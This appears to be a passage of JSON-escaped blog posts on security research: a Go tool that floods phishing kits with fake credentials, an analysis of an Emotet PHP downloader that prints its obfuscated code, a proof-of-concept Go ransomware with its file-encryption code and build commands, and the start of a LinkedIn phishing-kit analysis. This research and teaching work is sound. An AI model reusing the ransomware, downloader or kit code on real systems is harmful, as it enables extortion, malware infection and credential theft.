telefono\u0026lt;/label\u0026gt;\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;number\u0026#34; name=\u0026#34;cellulare\u0026#34; id=\u0026#34;_camp3\u0026#34; required tabindex=\u0026#34;3\u0026#34; value=\u0026#34;\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;label for=\u0026#34;camp4\u0026#34;\u0026gt;Se sei cliente Fideuram seleziona la casella in basso\u0026lt;/label\u0026gt;\u0026lt;/strong\u0026gt; \u0026lt;input class=\u0026#34;form-check-label\u0026#34; type=\u0026#34;checkbox\u0026#34; name=\u0026#34;fideuram\u0026#34; id=\u0026#34;_camp4\u0026#34; value=\u0026#34;Si\u0026#34; tabindex=\u0026#34;5\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;button style=\u0026#34;background-color: green;font-size : 20px;\u0026#34; type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary btn-lg btn-block\u0026#34;\u0026gt;ENTRA\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; The action attribute of the form specifies where the POST request is sent, in this case to /core/login.php. Using this address and the attributes name and type of the input fields, we can easily make a post with cURL:\n$ curl -d \u0026#34;codice=123\u0026amp;password=123\u0026amp;cellulare=12345678\u0026#34; \\ -X POST https://www.riscontrotitolare.com/core/login.php Please note that this kit is also logging the IP address of these requests, so be sure to run the line above behind a proxy or a VPN.\nThe POST made with cURL worked!\nAfter being sure that the POST request made it with cURL worked, we can start writing the code.\nPhishFlood: writing the code The idea of phishflood is to have a program that:\nautomatically detects the required attributes of the form and of the input fields makes POST requests with random data which are non easily distinguishable from authentic data uses various proxies to make requests (to hide our IP) wait a random time between two requests, to not create an obvious time frame of when the program was executed makes use of the goroutines to improve efficiency For the first point, I decided to use goquery to detect the form, get the content of the action attribute, and the name and type attributes of the other input parameters.\nFor brevity reasons, I excluded from the code below all the lines for handling possible errors.\nfunc getPostData(phishingUrl string, parsedProxies []string) (string, []string, []string) { postAction := \u0026#34;\u0026#34; var inputNames []string var inputTypes []string var myClient *http.Client // make post request using proxy if len(parsedProxies) != 0 { proxyURL, err := url.Parse(parsedProxies[0]) // be sure to handle the err.. myClient = \u0026amp;http.Client{Timeout: 15 * time.Second, Transport: \u0026amp;http.Transport{Proxy: http.ProxyURL(proxyURL)}} } else { myClient = \u0026amp;http.Client{Timeout: 15 * time.Second } req, err := http.NewRequest(\u0026#34;GET\u0026#34;, phishingUrl, nil) resp, err := myClient.Do(req) defer resp.Body.Close() if resp.StatusCode != 200 { fmt.Printf(\u0026#34;status code error: %d %s \\n\u0026#34;, resp.StatusCode, resp.Status) os.Exit(1) } // Load the HTML document and find the form with goquery doc, err := goquery.NewDocumentFromReader(resp.Body) doc.Find(\u0026#34;form\u0026#34;).Each(func(i int, form *goquery.Selection) { action, actionOk := form.Attr(\u0026#34;action\u0026#34;) if actionOk { form.Find(\u0026#34;input\u0026#34;).Each(func(i int, input *goquery.Selection) { nameattr, nameOk := input.Attr(\u0026#34;name\u0026#34;) typeattr, typeOk := input.Attr(\u0026#34;type\u0026#34;) // find input with name and attributes if actionOk \u0026amp;\u0026amp; nameOk \u0026amp;\u0026amp; typeOk { inputNames = append(inputNames, nameattr) inputTypes = append(inputTypes, typeattr) u, err := url.Parse(phishingUrl) // create full url for path where to submit the form u.Path = path.Join(u.Path, action) postAction = u.String() } }) }}) return postAction, inputNames, inputTypes } The beginning of the main function of our code takes the URL of the phishing page in input, calls the function getPostData (mentioned above) and prints the results:\nfunc main() { // check we have one input provided if len(os.Args) != 2 { fmt.Fprintf(os.Stderr, \u0026#34;Please specify one URL: ./phishflood *URL* \\n\u0026#34;) os.Exit(1) } // take a url from input phishingUrl := os.Args[1] // validate url provided if _, err := url.ParseRequestURI(phishingUrl); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;It was not possible to parse the URL\\n\u0026#34;) os.Exit(1) } // navigate to it and print findings postAction, inputNames, inputTypes := getPostData(phishingUrl) fmt.Printf(\u0026#34;[!] Found a form with action: %s \\n\u0026#34; + \u0026#34;[!] Input fields names found: %v\u0026#34; + \u0026#34;\\n[!] Input fields types found: %v\\n\\n\u0026#34;, postAction, inputNames, inputTypes) The rest of the main uses 10 goroutines to make the requests concurrently (well, almost concurrently because we have a random delay), and a channel ( ch ) to communicate when a goroutine finished.\n// set random seed rand.Seed(time.Now().UnixNano()) // create channel used for goroutines ch := make(chan string) // specify the number of routines to use routines := 10 // start goroutines for i := 0; i \u0026lt; routines; i++ { // create wait for a random number of seconds between 2 and 10 w := int(rand.Intn(10000-2000) + 2000) time.Sleep(time.Duration(w) * time.Millisecond) // send requests with fake data go flood(i, postAction, inputNames, inputTypes, ch) } // when POST request is completed, print the status code from the channel for i := 0; i \u0026lt; routines; i++ { fmt.Println(\u0026lt;-ch) } } A small delay between 10 and 2 seconds is introduced in the for loop. Ideally, this delay should be higher, to not make it obvious that these POST requests were automated.\nThe flood function needs a list of proxy addresses (px in the code below), which are used to make the requests without showing our IP address in the kit. The fake data which are going to be submitted are contained in vals and populated in a not sophisticated way: since all the input types are number for this kit, it is sufficient to create random numbers between a sufficiently long interval.\nIn Go, it is possible to create random number between an interval in the following way:\nrandomnumber := rand.Intn( max - min ) + min The input field with the name cellulare needed particular attention: \u0026ldquo;cellulare\u0026rdquo; stands for \u0026ldquo;mobile phone\u0026rdquo; in italian, so the interval for the random generation is a bit more complicated.\nAfter the POST request, the status code is sent to the channel, and the goroutine terminate its execution.\nfunc flood(i int, postAction string, inputNames []string, inputTypes []string, ch chan\u0026lt;- string) { // make post request using proxy proxyURL, _ := url.Parse(px[i%len(px)]) if err != nil { fmt.Fprintf(os.Stderr, \u0026#34;Error parsing the proxy address\\n\u0026#34;) os.Exit(1) } myClient := \u0026amp;http.Client{Timeout: 15 * time.Second, Transport: \u0026amp;http.Transport{Proxy: http.ProxyURL(proxyURL)}} // generate fake data vals := url.Values{} for i, valName := range inputNames { // \u0026#34;cellulare\u0026#34; is \u0026#34;mobile phone\u0026#34; in italian, so we // have a particular interval to make it realistic if valName == \u0026#34;cellulare\u0026#34; { val := rand.Intn(3499999999-3200000000) + 3200000000 vals.Set(valName, fmt.Sprintf(\u0026#34;%d\u0026#34;, val)) // these are generic numbers } else if inputTypes[i] == \u0026#34;number\u0026#34; { val := rand.Intn(99999999-10000000)+10000000 vals.Set(valName, fmt.Sprintf(\u0026#34;%d\u0026#34;,val)) } } // make the POST request resp, err := http.PostForm(postAction, vals) // print error if err != nil { fmt.Println(err) } else { // send to the channel the status code of the POST ch \u0026lt;- fmt.Sprintf(\u0026#34;Request #%d with these parameters {codice: %s,\u0026#34;, \u0026#34;cellulare: %s, password: %s} returned the following status code:\u0026#34;, \u0026#34;%d %s.\u0026#34;, i+1, vals.Get(\u0026#34;codice\u0026#34;), vals.Get(\u0026#34;cellulare\u0026#34;), vals.Get(\u0026#34;password\u0026#34;), resp.StatusCode, http.StatusText(resp.StatusCode)) } } Results and possible improvements If we run the code above specifying a URL, we should see something like this:\nOutput of phishflood\nDepending on the status of the proxies, we may have some timeout errors. However, when I checked the logs of the kit I was able to find our fake data:\nLogs on the phishing page\nThe main limitation of this poc is that is only compatible with these kinds of phishing kits. Two possible improvements are:\nFake data generation for different types of input fields. Many phishing kits are targeting email credentials, or credit cards number, the library faker could help in the generation of these data. Handling multiple forms. Some phishing kits ask the user to fill different forms, and sometimes the second form is accessible only if the first one is submitted. A possible approach to overcome this would be to continue submitting form with fake data as long as there is not a redirection or no more forms are found. Conclusion In this post we saw how to create a proof of concept to pollute with fake data the credentials stolen with a phishing kit. There is a lot of space for improvements, but, after checking the logs of the kit, I consider the proof of concept successful as it is.\nIf you want to play around with phishflood you can use this GitHub repo, I have organized the code and added some improvements. Feel free to let me know what features could be added.\n","permalink":"https://andpalmier.com/posts/flooding-phishing-kits/","summary":"Flooding a phishing kit with fake data to make it harder for threat actors","title":"PhishFlood: a poc for flooding phishing kits"},{"content":"Introduction During 2020, the Emotet malware distribution was silent between the beginning of February and the middle of July; this was the longest known break for Emotet. After this pause, the email campaigns started again, with multiple vendors reporting that hundreds of thousands of messages were detected every day1 2.\nThere is a long list of security researchers on Twitter that are interested in Emotet, with many accounts sharing samples and findings every day. During this summer I started writing multiple threads reporting abused \u0026ldquo;.it\u0026rdquo; domains which were used to distribute this malware. While I was working on one of this daily threads, I found something interesting:\nThis domain was reported in multiple occasions during the summer, and it was seen for the first time at the end of July:\nScreenshot from URLhaus\nI downloaded malware.zip and extracted the content. Although the PHP file in this archive is not detected as malicious in VirusTotal, it is actually used to download a document which contains malicious macros that will attempt to infect the machine.\nBackground The Emotet malware was firstly identified in 2014. At that time it was acting as a banking malware, attempting to steal sensitive data; however, during these years, several features were added such as the malspam distribution and the further installation of other malware. Emotet is currently considered one of the most costly threats, affecting not only individuals, but also private organizations, and even governments.\nThe primary distribution method for Emotet is through malspam: the malware is able to detect the contacts list of the infected machine and to replicate itself by sending emails to these contacts. In addition, since the email will be sent from an hijacked account, these will look less suspicious to the recipients.\nThe infection methods are multiple: malicious links, document containing macros or scripts. In this case, we will take a look at a PHP file which generates a malicious document file containing macros to infect the machine.\nAnalysis of the PHP downloader malware.zip contains a single PHP file (index.php), which reports August 25th as a modification date. Before analyzing the PHP file, it\u0026rsquo;s worth noting that only the archive malware.zip is found on VirusTotal, with 0 detections for the multiple engines and the first submission from September 26th.\nmalware.zip on VirusTotal\nThe PHP file, instead, has 0 matches.\nindex.php on VirusTotal\nBasic string obfuscation The first function that should be discussed in this analysis is called d5f44d5a7878a4(). Indeed, index.php contains some obfuscated strings to avoid being detected as malicious, and this function is used to de-obfuscate these strings. Here is the content of the function:\npublic function d5f44d5a7878a4($s) { $string = base64_decode($s); return explode(\u0026#39;::\u0026#39;, $string, 2)[1]; } We can see that it was used a very basic obfuscation technique. The de-obfuscation function decodes the given string with Base64 and proceed to create an array of strings by splitting the decoded string on the following sequence of characters \u0026quot;::\u0026quot;. The return value of d5f44d5a7878a4() is contained in the second element of the array obtained after the split.\nFor instance, d5f44d5a7878a4() is called later in the file in this way:\n$qString = $this-\u0026gt;d5f44d5a7878a4(\u0026#34;TGhDY1VXdENMUT09OjpRVUVSWV9TVFJJTkc=\u0026#34;); Decoding \u0026ldquo;TGhDY1VXdENMUT09OjpRVUVSWV9TVFJJTkc=\u0026rdquo; with Base64 we obtain \u0026ldquo;LhCcUWtCLQ==::QUERY_STRING\u0026rdquo;, thus the variable $qString1 will contain \u0026ldquo;QUERY_STRING\u0026rdquo;.\nEntry point The entry point of index.php is represented by the p5f44d5a786a7c() function. Here are the very first lines:\npublic function p5f44d5a786a7c() { $qString = $this-\u0026gt;d5f44d5a7878a4(\u0026#34;TGhDY1VXdENMUT09OjpRVUVSWV9TVFJJTkc=\u0026#34;); if (!empty($_SERVER[$qString])) { return $_SERVER[$qString]; } As we already saw it before, we know that the function will just return the full query string if its not empty. If we go on, we will find:\n$path = \u0026#39;.\u0026#39; . sha1(basename(dirname(__FILE__))); if (($fp = fopen($path, \u0026#39;c+\u0026#39;)) !== false) { if (flock($fp, LOCK_EX)) { $stat = array(); $fileSize = filesize($path); if ($fileSize \u0026gt; 0) { $stat = json_decode(fread($fp, $fileSize), true); } The function will now create a hidden JSON file (it has a \u0026quot;.\u0026quot; at the beginning) having as a filename the SHA-1 hash of the name of the current directory.\n$platform = $this-\u0026gt;getPlatform(); if (!isset($stat[$platform]) || !is_int($stat[$platform])) { $stat[$platform] = 1; } else { $stat[$platform]++; } fseek($fp, 0); fwrite($fp, json_encode($stat)); fflush($fp); flock($fp, LOCK_UN); } fclose($fp); } As we can see from the code above, the previously created JSON file is used to count how many instances of different platforms visited the page. The getPlatform() function contains the following:\nprivate function getPlatform() { // $userAgent = HTTP_USER_AGENT $userAgent = ( isset($_SERVER[$this-\u0026gt; d5f44d5a7878a4(\u0026#34;YWV6ejFFekE5TE5NbVE9PTo6SFRUUF9VU0VSX0FHRU5U\u0026#34;)]) ? $_SERVER[$this-\u0026gt; d5f44d5a7878a4(\u0026#34;YWV6ejFFekE5TE5NbVE9PTo6SFRUUF9VU0VSX0FHRU5U\u0026#34;)] : \u0026#39;\u0026#39; ); $platform = 0; // PLATFORM_UNKNOWN if (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;N3VFR0dla2xiZz09Ojp3aW5kb3dz\u0026#34;)) !== false) { $platform = 4; // PLATFORM_WINDOWS -\u0026gt; windows } else if (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;QlFuRXdiZlRKZz09OjppUGFk\u0026#34;)) !== false) { $platform = 2; // PLATFORM_APPLE -\u0026gt; BQnEwbfTJg==::iPad } else if (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;V1hMdTYyTUw6OmlQb2Q=\u0026#34;)) !== false) { $platform = 2; // PLATFORM_APPLE -\u0026gt; iPod } else if (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;N1c3WjVYeld1c0lQZmNnPTo6aVBob25l\u0026#34;)) !== false) { $platform = 2; // PLATFORM_APPLE -\u0026gt; iPhone } elseif (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;NllXNWhXMk43RzR4UURFPTo6bWFj\u0026#34;)) !== false) { $platform = 2; // PLATFORM_APPLE -\u0026gt; mac } elseif (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;V0RvWnVPZE5CZnpiZFdVZU93PT06OmFuZHJvaWQ=\u0026#34;)) !== false) { $platform = 1; // PLATFORM_ANDROID -\u0026gt; android } elseif (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;eVhldjU2RFlYUT09OjpsaW51eA==\u0026#34;)) !== false) { $platform = 3; // PLATFORM_LINUX -\u0026gt; linux } elseif (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;TUU0ZmFKekdiRGFPaU42WDo6d2lu\u0026#34;)) !== false) { $platform = 4; // PLATFORM_WINDOWS -\u0026gt; win } elseif (stripos($userAgent, $this-\u0026gt; d5f44d5a7878a4(\u0026#34;cHJoVk9kN291L3FFN0ZxdTo6aU9T\u0026#34;)) !== false) { $platform = 2; // PLATFORM_APPLE -\u0026gt; iOS } return $platform; } I have inserted some comments to make it easier to read, but the piece of code above is used to check the Navigator.platform attribute which every browser expose to the visited pages. Since we have different options, here is a quick recap of what we will get after the execution of getPlatform():\nUnkown -\u0026gt; 0 Android -\u0026gt; 1 Apple -\u0026gt; 2 Linux\t-\u0026gt; 3 Windows\t-\u0026gt; 4 Unfortunately I was not able to access the original log file in the first screenshot.\nThe malicious document The following steps of index.php include a long list of headers being set. I have added again some comments to make it easier to read the code below, since the function d5f44d5a7878a4() is used to de-obfuscate strings while setting almost all the headers.\n// Resist Varnish-cache setcookie(uniqid(), time(), time() + 60, \u0026#39;/\u0026#39;); // Send cache headers // gmdate(\u0026#34;D, d M Y H:i:s\u0026#34; . \u0026#34;GMT\u0026#34;) $timestamp = gmdate($this-\u0026gt; d5f44d5a7878a4(\u0026#34;N0s4eFRuRTBZMkNlenRiemlpWT06OkQsIGQgTSBZIEg6aTpz\u0026#34;)) . $this-\u0026gt;d5f44d5a7878a4(\u0026#34;SUZYQlBrOFJ6d20zNFl4cmNFVlY6OiBHTVQ=\u0026#34;); // header(\u0026#34;Cache-Control: no-cache, must-revalidate\u0026#34;) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;b0taWDZCUDRleW0veVh4WWtXNGQ6OkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGU=\u0026#34;)); // header(\u0026#34;Pragma: no-cache\u0026#34;) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;U29wSEl0YnRiMEU9OjpQcmFnbWE6IG5vLWNhY2hl\u0026#34;)); // header(\u0026#34;Last-Modified:\u0026#34; . $timestamp) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;L1VvdkIxND06Okxhc3QtTW9kaWZpZWQ6IA==\u0026#34;) . $timestamp); // header(\u0026#34;Expires:\u0026#34; . $timestamp) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;ZU44eGw1T2N2azlUZ1RUTVhNTU86OkV4cGlyZXM6IA==\u0026#34;) . $timestamp); // Send content headers $contentName = \u0026#39;INV_O2GT57A7QBKNN7.doc\u0026#39;; $contentType = \u0026#39;application/msword\u0026#39;; // header(\u0026#34;Content-Type:\u0026#34; . $contentType) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;RVpCZ041ZW5TWCtYeE00WGhSRlQ6OkNvbnRlbnQtVHlwZTog\u0026#34;) . $contentType); // header(\u0026#34;Content-Disposition: attachment; filename=\u0026#34; . $contentName\u0026#34;) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;NUl6QUhHZ2VPcmpnTzJ0VkpZUTQ6OkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSI=\u0026#34;) . $contentName . \u0026#39;\u0026#34;\u0026#39;); // header(\u0026#34;Content-Transfer-Encoding: binary\u0026#34;) header($this-\u0026gt;d5f44d5a7878a4( \u0026#34;ekFUS003Szl3Zz09OjpDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiaW5hcnk=\u0026#34;)); It\u0026rsquo;s also worth noting that the contentName and contentType (respectively the filename and the file type) are also specified.\nThe only remaining step is to set the actual content of the malicious document file. This content is hardcoded in the $contentData variable; unfortunately the string is too long to be reported here, but here is a screenshot:\nJust few lines of the encoded malicious document\nThe string in $contentData is then used to create the document as follows:\nreturn gzinflate(base64_decode($contentData)); After decoding it with Base64 and inflating the result, the malicious document is ready and the browser used by the victim will prompt the download of a file called INV_O2GT57A7QBKNN7.doc. I have created the following CyberChef3 recipe to replicate this last step from index.php:\nFrom_Base64(\u0026#39;A-Za-z0-9+/=\u0026#39;,true) Raw_Inflate(0,0,\u0026#39;Block\u0026#39;,false,false) SHA2(\u0026#39;256\u0026#39;) I have included in the recipe an additional step which creates the hash of the file, that can be used to detect if it\u0026rsquo;s malicious.\nYou can also see the CyberChef recipe by clicking here.\nThe document file obtained at the end of the execution of index.php is obviously malicious, being detected by multiple engines in VirusTotal, as you can see from the screenshot below:\nScreenshot from VirusTotal\nIf you want a sample of the file, you can find it in the MalwareBazaar database following this link.\nIOCs Here is a list of the hashes of files which were analyzed in the post:\nmalware.zip\tdb1617dc4a09fe856aea8041b90e73467e8d51ad4bdc1fd9a7e0a3197e66339c index.php\ta48791d0e22ba693529285555ebb559bac1786bd703406deb5e1ef9ee8616cc4 INV_O2GT57A7QBKNN7.doc\ta302a49cafa48ab0b8d686124f89eb0517a014f31fcb5dc4eb8b574854fbc0c8 If you want to take a look at the original PHP file, you can find it here.\nConclusion In this post we analyzed a PHP file used to distribute Emotet, a Trojan that has been active since 2014. We saw how index.php uses some basic obfuscation, especially when setting the headers; it also logs which types of OSs are accessing the page in a JSON file.\nAt the end of the execution, a malicious document called INV_O2GT57A7QBKNN7.doc is ready for the download.\nIf you are interested in Emotet, follow @Cryptolaemus1 on Twitter and the people in the Cryptolaemus team.\nA Comprehensive Look at Emotet’s Summer 2020 Return on ProofPoint\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nEmotet botnet returns after a five-month absence on ZDNet\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCyberChef\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://andpalmier.com/posts/emotet-php-maldoc/","summary":"Analysis of a PHP file used to generate a document containing malicious macros for Emotet infection","title":"Emotet infection from PHP: generation of a malicious doc"},{"content":" Introduction This is a blog post about my last project: goransom, which is a proof of concept for a simple ransowmare written in Go. The purpose of the project is purely educative; I wanted to get a bit more familiar with the language and its patterns.\nI am not responsible for the use you make of this tool. Do not use it on systems where you don\u0026rsquo;t have the permission of the owner.\nBackground Ransomware is a particular type of malware which encrypts the victim\u0026rsquo;s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: WannaCry, CryptoLocker and Locky.\nWhile developing an actual ransomware is far from being an easy task, I decided to create a proof of concept with Go to have fun and learn something new.\nGo makes it easy to write malware for different reasons. Firstly, it works nearly everywhere: thanks to cross-compilation, we can write code in Go and use it to obtain an executable for all the most common architectures. Go also has a strong community, with a lot of libraries available. Lastly, it is quite easy to learn and to read, which allows malware programmers to re-engineer the code without too many hassles in case the executable gets detected by anti-viruses.\nTechnical details Being a proof of concept, goransom won\u0026rsquo;t automatically start to encrypt the full hard drive. We don\u0026rsquo;t want to cause trouble here.\nInstead, the program allows to specify in input the path of the target file or folder to encrypt. goransom also requires a secret string to be provided, this is going to be used to derive the key for encrypting the files.\nAfter the files are successfully encrypted, they will have a .locked suffix in the filename. In order to get the original files back, the -decrypt flag can be used, specifying the target files we want to decrypt and the secret which was used for the encryption.\nKey generation, encryption and decryption goransom encrypts and decrypts the given files using AES block cipher, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the crypto package and its subdirectories.\nGo makes THIS super easy! Pic from Wikipedia\nSince AES allows three different key lengths: 128, 192 and 256, I decided to go for the 256-bits key, which can be obtained from a sha256 hash of the secret string given in input. Here is how the key derivation function looks like:\n// given a secret returns the sha256 hash // used for encryption/decryption func DeriveKey(secret string)[32]byte{ return sha256.Sum256([]byte(secret)) } The encryption function is called for every file which has to be encrypted; it reads the content of the file and use it as a plaintext for our cipher.\nThe initialization vector (IV) is used by many modes of operation to randomize the encryption and produce different ciphertexts when plaintext and key are the same. The security requirements of the IV are different from the ones of the key: the IV needs to be unique, but it does not need to be a secret. It is therefore quite common to include it at the beginning of the ciphertext.\n// open the given file data, err := ioutil.ReadFile(filePath) if err != nil { panic(err) } // create AES CFB cipher block, err := aes.NewCipher(secretKey) if err != nil { panic(err) } // The IV needs to be unique, but not secure. therefore it\u0026#39;s common to // include it at the beginning of the ciphertext. // See here: https://golang.org/pkg/crypto/cipher/ ciphertext := make([]byte, aes.BlockSize+len(data)) iv := ciphertext[:aes.BlockSize] if _, err := io.ReadFull(rand.Reader, iv); err != nil { panic(err) } stream := cipher.NewCFBEncrypter(block, iv) stream.XORKeyStream(ciphertext[aes.BlockSize:], data) // write the ciphertext in the file ioutil.WriteFile(filePath,ciphertext,0644) A \u0026quot;.locked\u0026quot; suffix is then appended to the filename.\nThe decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly form the documentation of the crypto/cipher package.\n// open the given file ciphertext, err := ioutil.ReadFile(filePath) if err != nil { panic(err) } // create AES CFB cipher block, err := aes.NewCipher(secretKey) if err != nil { panic(err) } // The IV needs to be unique, but not secure. Therefore it\u0026#39;s common to // include it at the beginning of the ciphertext. // See here: https://golang.org/pkg/crypto/cipher/ if len(ciphertext) \u0026lt; aes.BlockSize { panic(\u0026#34;ciphertext too short\u0026#34;) } iv := ciphertext[:aes.BlockSize] ciphertext = ciphertext[aes.BlockSize:] stream := cipher.NewCFBDecrypter(block, iv) stream.XORKeyStream(ciphertext, ciphertext) // write the plaintext in the file ioutil.WriteFile(filePath,ciphertext,0644) After the decryption, the .locked suffix is removed from the filename, which - if the decryption worked correctly - should now contain the original file.\nCompile for multiple architectures I already mentioned how useful the cross-compilation is, but examples were not provided, so here they are.\nAssuming we have our copy of goransom, if we want to build it for our architecture and OS, it is enough to use:\n$ go build goransom.go $ file goransom goransom: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked A goransom executable will be created, which can be launched as usual. However, if we want to compile the same code for different OSes and architecture, things are not much more complicated.\nHere is how to get a Windows executable on Linux:\n$ GOOS=windows GOARCH=386 go build -o goransom.exe goransom.go $ file goransom.exe goransom.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows and this is the process for MacOS:\n$ GOOS=darwin GOARCH=amd64 go build ransom.go $ file goransom goransom: Mach-O 64-bit x86_64 executable A first run This section provides just an example of how to run goransom on Linux. Assuming we have the following structure:\n$ tree . ├── goransom └── folder └── textfile $ cat folder/textfile THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME Now goransom will be used to encrypt all the files in folder using supersecret as a secret:\n$ ./goransom -secret supersecret -target folder Operating on folder Operating on folder/textfile textfile is now encrypted and has been renamed textfile.locked.\n$ tree . ├── goransom └── folder └── textfile.locked $ cat folder/textfile.locked �C4�w��i�G⛘]+�~O(�@f1 �\u0026lt; �0k\u0026gt;\u0026lt;�ZlEV\u0026amp;yj��;)�[1m% Assuming other files were in the folder they would be locked as well, since the entire folder was specified as a target for goransom.\nDecrypting the file is quite easy: just repeat the command for the encryption (same target and same secret) and append the -decrypt command:\n$ ./goransom -secret supersecret -target folder -decrypt Operating on folder Operating on folder/textfile.locked $ tree . ├── goransom └── folder └── textfile $ cat folder/textfile THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME It works in the same way in Windows 10\nDetection While I was testing goransom on Windows 10, I had the issue that Windows Security complained about it:\nWindows Security doesn\u0026rsquo;t like goransom\nSo I uploaded three different goransom executables on VirusTotal, to see if they are detected. Here are the results:\ngoransom for Windows on VirusTotal\ngoransom for Linux on VirusTotal\ngoransom for macOs on VirusTotal\nThe Windows version is the only one which is considered malicious, since 43 (!!) engines flagged it. Please note that the source code which was used to compile the three executables is exactly the same. Also, one of the functions in goransom is called ransomware, which may be the reason why some engines flags the Windows executable.\nUnfortunately goransom cannot be readily tested against public sandboxes, as it requires an input to be executed properly. I am not aware of online tools which allow this level of interaction with an executable, but if you know some, please let me know. It would be interesting to see the outcome.\nConclusion goransom was super fun and relatively easy to make. The crypto package and the goroutines allow the code to be easy to read and efficient.\nThere are a number of improvements which could be added, but, in the end, I consider the proof of concept successful as it is. And the fact that VirusTotal and Microsoft Security do not like goransom makes it even more successful.\nYou can find goransom on my GitHub, let me know if you have suggestions or tips to improve the quality and structure of the code.\nIf you are looking for other proof of concept of ransomware written in Go, check out these projects:\ngo-crypt goransomware go-cry ","permalink":"https://andpalmier.com/posts/poc-goransom/","summary":"Writing a super simple proof of concept for a ransowmare in Go","title":"Proof of concept of a ransowmare in Go"},{"content":" I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.\nLet\u0026rsquo;s start from the beginning The kit was created to steal LinkedIn credentials:\nHow this phishing kit looks like when deployed\nAt a first look, we can notice some characteristics of this page which makes it different from the usual fake login:\nthe message at the top: \u0026ldquo;Send Your Product quotes to interested buyers via LinkedIn\u0026rdquo; the two input fields for the password (and the missing \u0026lsquo;Forgot password?\u0026rsquo; link) the message under the Continue button: \u0026ldquo;By clicking Continue you proceed to send your business catalogues and quotes\u0026rdquo; So this page is not targeting the usual LinkedIn user: it is pretending to provide a feature to send catalogues and quotes using the social network.\nLet\u0026rsquo;s now check the zip of this kit on VirusTotal, using sha256sum:\n$ sha256sum content.zip e34795a90e1196e5b415ee7386d75474dfc8bcdb4653dcf7b83551a8497e257b content.zip VirusTotal detections for the zip of this phishing kit\nExplore the kit If we extract the archive, we will see the following structure:\n$ tree -a content content ├── blocker.php ├── .htaccess ├── index.php ├── Linkedin │ ├── geoplugin.class.php │ ├── index.php │ └── loginss.php ├── robots.txt └── vu.txt 1 directory, 7 files This kit is simpler than the one analyzed in the previous post, and it contains only the LinkedIn template. The presence of a txt file (vu.txt) usually indicates that the kit is logging information about victims or visitors. It is also interesting to note that a .htaccess and robots.txt files are shipped with the kit itself.\nEntry point So we can start our analysis from the entry point (index.php), here are the first lines:\n\u0026lt;?php $emai = $_GET[\u0026#39;user\u0026#39;]; include(\u0026#39;blocker.php\u0026#39;); $DIR=md5(rand(0,100000000000)); function recurse_copy($home,$DIR) { $dir = opendir($home); @mkdir($DIR); while(false !== ( $file = readdir($dir)) ) { if (( $file != \u0026#39;.\u0026#39; ) \u0026amp;\u0026amp; ( $file != \u0026#39;..\u0026#39; )) { if ( is_dir($home . \u0026#39;/\u0026#39; . $file) ) { recurse_copy($home . \u0026#39;/\u0026#39; . $file,$DIR . \u0026#39;/\u0026#39; . $file); } else { copy($home . \u0026#39;/\u0026#39; . $file,$DIR . \u0026#39;/\u0026#39; . $file); } } } closedir($dir); } $home=\u0026#34;Linkedin\u0026#34;; recurse_copy( $home, $DIR ); We will take a look at blocker.php in the next paragraph, for now, let\u0026rsquo;s just say that it is included, and let\u0026rsquo;s focus on the following lines. A new directory is created using @mkdir, and it has a name obtained from the md5 hash of a random number: this means that a new folder will be created every time index.php is reached. The files included in the \u0026lsquo;Linkedin\u0026rsquo; folder are then copied in this newly created folder using the recurse_copy function.\nLet\u0026rsquo;s continue with the definition of a header:\n\u0026lt;?php header(\u0026#34;location:$DIR?user=$emai\u0026amp;.verify?service=mail\u0026amp;data:text/html;charset=utf-8;base64, PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt\u0026#34;); Some parameters are specified for a redirection: location is equal to the newly created folder, user equal to $_GET['user'] (it will be used to automatically fill the email address in the fake LinkedIn form) and service is set to mail. This header also includes a base64 string which can easily be decoded:\n$ echo 